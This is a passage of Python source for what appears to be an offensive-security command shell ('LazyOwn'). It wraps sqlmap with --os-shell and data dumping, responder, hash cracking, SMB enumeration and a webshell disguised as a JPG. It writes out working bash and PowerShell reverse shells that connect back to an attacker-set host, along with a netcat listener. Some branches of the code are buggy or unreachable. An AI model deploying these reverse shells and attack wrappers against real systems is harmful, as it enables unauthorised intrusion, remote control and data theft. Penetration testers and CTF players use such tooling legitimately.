        """ping -c 1 10.10.10.10"""
        rhost = self.params["rhost"]
        if not rhost:
            print(
                "add domain and rhost must be set to more info see help set (set rhost 10.10.10.10) ex: addhost domain.ext"
            )
            return
        print(f"[+] try... ping -c 1 {rhost} ")
        # Ejecutar el comando ping y capturar la salida
        result = subprocess.run(
            ["ping", "-c", "1", rhost], capture_output=True, text=True
        )

        # Verificar la salida y determinar el sistema operativo basado en TTL
        if result.returncode == 0:
            # El ping fue exitoso, parsear la respuesta para obtener el TTL
            try:
                ttl_index = result.stdout.find("ttl=")
                if ttl_index != -1:
                    ttl_value = int(
                        result.stdout[ttl_index + 4 : ttl_index + 7]
                    )  # Obtener el valor de TTL
                    print("[+] TTL:", ttl_value)

                    # Determinar basado en el TTL
                    if ttl_value <= 60 or ttl_value <= 64:
                        print(f"{GREEN}[*]Host activo {CYAN}probablemente es {BLUE}Linux{RESET}")
                    elif ttl_value <= 120 or ttl_value <= 128:
                        print(f"{GREEN}[*]Host activo {CYAN}probablemente es {RED}Windows{RESET}")
                    else:
                        print(
                            "[-] No se puede determinar con certeza el sistema operativo"
                        )
                else:
                    print("[-] No se encontró el TTL en la salida del ping")

            except ValueError:
                print("[-] No se pudo convertir el TTL a un número entero")
        else:
            print("[-] No se pudo realizar el ping al host")
        print(f"[*] Done... ping -c 1 {rhost} ")

    def do_gospider(self, line):
        """try gospider"""
        rhost = self.params["rhost"]
        if line == "url":
            url = self.params["url"]
            if not url:
                print(
                    "if you pass the param url, url mus be set, ex: set url http://url.ext"
                )
                return

            print(f"try gospider -s {url}")
            os.system(f"gospider -s {url}")
            return

        if not rhost:
            print("rhost must be set")
            return
        if is_binary_present("gospider"):
            print(f"try... gospider -s http://{rhost}")
            os.system(f"gospider -s http://{rhost}")
        else:
            print("gospider is not installed, installing... (control + c to cancel)")
            os.system(f"sudo apt install gospider -y && gospider -s http://{rhost}")

    def do_arpscan(self, line):
        """try arp-scan"""
        if not self.params["device"]:
            print("[?] device must be set")
            return
        device = self.params["device"]
        print("[+] try to arp-scan sudo arp-scan -I DEVICE --localnet")
        os.system(f"sudo arp-scan -I {device} --localnet")

    def do_lazypwn(self, line):
        """LazyPwn"""
        os.system("python3 modules/lazypwn.py")

    def do_fixel(self, line):
        """to fix perms"""
        os.system("dos2unix *")
        os.system("dos2unix modules/*")
        os.system("dos2unix modules/cgi-bin/*")

    def do_smbserver(self, line):
        """Lazy imacket smbserver"""
        print("[*] trying sudo impacket-smbserver smbfolder $(pwd) -smb2support ...")
        os.system("sudo impacket-smbserver smbfolder $(pwd) -smb2support")

    def do_sqlmap(self, line):
        """Lazy sqlmap try sqlmap -wizard if don't know how to use requests.txt file always start with req and first parameter"""
        url = self.params["url"]

        if line:
            if line.startswith("req"):
                parts = line.split(" ")
                print("[?] Nùmero de parametros: " + str(len(parts)))

                if len(parts) == 2:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    path = os.getcwd()
                    print(path)
                    file = path + "/sessions/" + arg1
                    print(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print(
                            f"Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print(
                        f"[*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                    os.system(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch --dbs --threads 10 --time-sec 10"
                    )
                if len(parts) == 3:
                    arg1 = parts[0]
                    arg2 = parts[1]
                    arg3 = parts[2]
                    path = os.getcwd()
                    print(path)
                    file = path + "/sessions/" + arg1
                    print(file)
                    if not os.path.isfile(file) or not os.access(file, os.R_OK):
                        print(
                            f"Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                        )

                        return
                    print(
                        f"[*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 10"
                    )
                    os.system(
                        f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} --tables --dump --threads 3"
                    )
            if len(parts) == 4:
                arg1 = parts[0]
                arg2 = parts[1]
                arg3 = parts[2]
                arg4 = parts[3]
                path = os.getcwd()
                print(path)
                file = path + "/sessions/" + arg1
                print(file)
                if not os.path.isfile(file) or not os.access(file, os.R_OK):
                    print(
                        f"Error: El archivo '{arg1}' no existe o no es legible en el directorio sessions."
                    )

                    return
                print(
                    f"[*] Try... sqlmap -r {arg1} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 10"
                )
                os.system(
                    f"sqlmap -r {file} --level 5 --risk 3 -p {arg2} --batch -D {arg3} -T {arg4} --dump --threads 3"
                )
            elif line.startswith("-wiz"):
                print("[*] Try... sqlmap --wizard")
                os.system("sqlmap -wizard")
        else:
            if not url:
                print(
                    "[?] url must be set, ex: (set url http://url.com), see <help set> or <help sqlmap> to more info..."
                )
            return

            print(f"[*] try... sqlmap -u {url} --os-shell --forms --crawl=2")
            os.system(f"sqlmap -u {url} --os-shell --forms --crawl=2")
        return

    def do_proxy(self, line):
        """Small proxy to modify the request on the fly..."""

        print("[*] ejecutando Lazy Proxy ...")
        os.system(f"python3 modules/lazyproxy.py")
        return

    def do_createwebshell(self, line):
        """Crea una webshell disfrazada de jpg en el directorio sessions/"""
        print("creando la shell disfrazada de jpg")
        os.system("python3 modules/lazycreate_webshell.py")
        return
    
    def do_createrevshell(self, line):
        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]

        if not lport or not lhost:
            print(f"[?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
            return

        revshell = f"""
#!/bin/bash
bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
"""            
        print(f"[*] Try... echo '{revshell}' > sessions/revshell.sh ")
        os.system(f"echo '{revshell}' > sessions/revshell.sh ")

    def do_createwinrevshell(self, line):
        """Crea un script en el directorio sessions con una reverse shell con los datos en lhost y lport"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        filename = 'sessions/revshell.ps1'
        if not lport or not lhost:
            print(f"[?] lport and lhost must be set use: set lport 443 and set lhost 10.10.10.10 or use command payload")
            return

        revshell = """
$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
""".replace('{lhost}',lhost).replace('{lport}',str(lport))

        print(f"[*] Try... echo '{revshell}' > sessions/revshell.ps1 \n")
        
        with open(filename, 'w') as f:
            f.write(revshell)
        f.close()
        print(f"[*] Archivo {filename} creado con èxito en el directorio sessions con contenido: {revshell} ")

    def do_createhash(self, line):
        """Crea un archivo hash.txt en el directorio sessions"""
        print(f"creando archivo sessions/hash.txt con el siguiente contenido {line}")
        os.system(f"echo '{line}' > sessions/hash.txt")
        return

    def do_dirsearch(self, line):
        """dirsearch -u http://url.ext/ -x 403,404,400"""
        url = self.params["url"]
        if not url:
            print("url must be set: use set url http://url.ext/ more info in help set")
            return
        if is_binary_present("dirsearch"):
            print("[?]Try... dirsearch -u http://url.ext/ -x 403,404,400")
            os.system(f"dirsearch -u {url} -x 403,404,400")
        else:
            print("dirsearch is not installed, installing... (control + c to cancel)")
            os.system(
                f"sudo apt install dirsearch -y && dirsearch -u {url} -x 403,404,400"
            )
        return

    def do_john2hash(self, line):
        """sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt"""
        wordlist = self.params["wordlist"]
        if not wordlist:
            print("wordlist must be set use set wordlist <path_to_wordlist>")
            return
        if line:
            print("sudo john hash.txt --show")
            os.system("sudo john sessions/hash.txt --show")
        else:
            print("sudo john hash.txt --show")
            os.system(f"sudo john sessions/hash.txt --wordlist={wordlist}")
        return

    def do_hashcat(self, line):
        """hashcat -a 0 -m 0 841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt"""
        wordlist = self.params["wordlist"]
        if not wordlist or not line:
            print(
                "wordlist must be set and you need pass the hash in argument ex: hashcat hash"
            )
            return
        print(f"hashcat -a 0 -m 0 {line} {wordlist} --show")
        os.system(f"hashcat -a 0 -m 0 {line} {wordlist} --show")
        return

    def do_responder(self, line):
        """sudo responder -I tun0"""
        device = self.params["device"]
        if not device:
            print("device must be set use set device <network_device_ex_tun0>")
            return
        print(f"sudo responder -I {device}")
        os.system(f"sudo responder -I {device}")
        return

    def do_ip(self,line):
        """ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }' and copy de ip to clipboard :)"""
        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
        os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
        print(f"{BLUE}[*] ip from tun0 copied to clipboard :) {RESET}")
        return
        
    def do_rhost(self,line):
        """Copy rhost to clipboard"""
        rhost = self.params["rhost"]
        if not rhost:
            print(f"{RED}[?] {YELLOW} rhost must be set, use: {GREEN}payload {YELLOW}or {GREEN}set rhost 10.10.10.10{RESET}")
            return
        os.system(f"echo '{rhost}' | xclip -sel clip")
        print(f"{BLUE}[*] ip from payload: {rhost=}, copied to clipboard :) {RESET}")
        return

    def do_banner(self,line):
        """Show the banner"""
        print(f"{BG_BLACK}{RED}{BANNER}{MAGENTA}Autor: {CYAN}grisUN0{RESET}")
        print(LazyOwnShell().intro)
        return

    def do_py3ttyup(self,line):
        """copy to clipboard tipical python3 -c 'import pty; pty.spawn ... bla bla blah... """
        os.system("echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip")
        print("[+] Try... echo \"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\"| xclip -sel clip # copied to clipboard :) ")
        return
    
    def do_rev(self,line):
        """Copy a revshell to clipboard"""
        lhost = self.params["lhost"]
        lport = self.params["lport"]
        if not lhost or not lport:
            print(f"{YELLOW} [?] lhost and lport must be set.{RESET}")
            return
        print(f"[+] Try ... bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'")
        os.system(f"echo \"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\" |  xclip -sel clip")
        return
    def do_nc(self,line):
        """run nc -lvnp 6666 :) """
        lport = self.params["lport"]
        if not lport and not line:
            print(f"{YELLOW} [?] lport must be set or pass the port by parameter like: nc 6666.{RESET}")
            return
        if not line:
            print(f"{GREEN}[+] Try.. nc -lvnp {lport}{RESET}")
            os.system(f"nc -lvnp {lport}")
        else:
            print(f"{GREEN}[+] Try.. nc -lvnp {line}{RESET}")
            os.system(f"nc -lvnp {line}")
        return
    def do_sh(self,line):
        """execute some command direct in shell to avoid exit LazyOwn ;)"""
        if not line:
            print(f"{YELLOW}[?] you must pass the command linke argument")
            return
        print(f"{GREEN}[*]Try... {line}{RESET}")
        os.system(f"{line}")
        return

    def do_pwd(self,line):
        """'echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"'"""
        print(f'{GREEN}[*]Try echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"{RESET}')
        os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"')
        os.system("pwd | xclip -sel clip")
        print(f"{GREEN}[*] pwd directory copied to clipboard{RESET}")
        return

    def do_vpn(self,line):
        """Open vpn like htb vpn"""
        print("[+] Try... sudo openvpn *.ovpn")
        os.system("sudo openvpn *.ovpn")
        return

    def do_www(slf, line):
        """Start a web server with python3"""
        os.system("ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,\"\",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, \"/\"); print \"[\033[96m\" iface\"\033[0m] \"a[1] }'")
        os.system("ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f1 | xclip -sel clip")
        os.system('echo -e "[\e[96m`pwd`\e[0m]\e[34m" && cd sessions && ls && echo -en "\e[0m"')
        print(f"{YELLOW}[*] {GREEN} Web server at sessions in port {RED} 80 {RESET}")
        os.system("cd sessions && sudo python3 -m http.server 80")
        print(f"{RED}[*] {YELLOW} Shutdown Web server at sessions in port {RED} 80 {RESET}")
        return

    def do_samrdump(self, line):
        """impacket-samrdump -port 445 10.10.10.10"""
        if not self.params["rhost"]:
            print("[?] rhost must be set")
            return
        rhost = self.params["rhost"]
        print(f"try impacket-samrdump -port 139  {rhost}")
        os.system(f"impacket-samrdump -port 139  {rhost}")
        print(f"try impacket-samrdump -port 445  {rhost}")
        os.system(f"impacket-samrdump -port 445  {rhost}")

        return
    def do_clean(self, line):
        """delete all from sessions"""
        os.system("rm sessions/*.nmap sessions/revshell* sessions/*.php sessions/hash.txt reports puertos -rf")
        print(f"{GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
    def do_encrypt(self, line):
        """Encrypt a file using XOR. Usage: encrypt <file_path> <key>"""
        args = shlex.split(line)
        if len(args) != 2:
            print("[?] Usage: encrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            encrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path + ".enc", "wb") as f:
                f.write(encrypted_data)
            print(f"[+] File encrypted: {file_path}.enc")
        except FileNotFoundError:
            print(f"[?] File not found: {file_path}")

    def do_decrypt(self, line):
        """Decrypt a file using XOR. Usage: decrypt <file_path> <key>"""
        args = shlex.split(line)
        if len(args) != 2:
            print("[?] Usage: decrypt <file_path> <key>")
            return

        file_path, key = args

        try:
            with open(file_path, "rb") as f:
                data = f.read()

            decrypted_data = xor_encrypt_decrypt(data, key)
            with open(file_path.replace(".enc", ""), "wb") as f:
                f.write(decrypted_data)
            print(f"[+] File decrypted: {file_path.replace('.enc', '')}")
        except FileNotFoundError:
            print(f"[?] File not found: {file_path}")

    def get_output(self):
        """Devuelve la salida acumulada"""
        return self.output


def xor_encrypt_decrypt(data, key):
    """XOR Encrypt or Decrypt data with a given key"""
    key_bytes = bytes(key, "utf-8")
    key_length = len(key_bytes)
    return bytearray([data[i] ^ key_bytes[i % key_length] for i in range(len(data))])


if __name__ == "__main__":
    # Activar el entorno virtual
    activate_virtualenv('env')
    LazyOwnShell().cmdloop()
